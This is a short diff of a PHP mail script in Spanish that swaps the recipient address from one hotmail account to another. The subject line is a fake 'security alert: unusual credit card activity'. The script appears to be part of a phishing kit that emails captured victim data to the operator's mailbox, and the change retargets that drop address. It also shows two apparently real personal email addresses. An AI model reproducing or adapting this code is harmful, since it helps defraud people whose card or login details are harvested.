@@ -2,7 +2,7 @@
   $headers = [];
 
   //quien recibe 
-  $to = 'belkysbenavides@hotmail.com'; 
+  $to = 'ronneybetancourt@hotmail.com'; 
   // TITULO
   $subject = "Alerta de Seguridad: Actividad inusual de la tarjeta de credito ";  
 
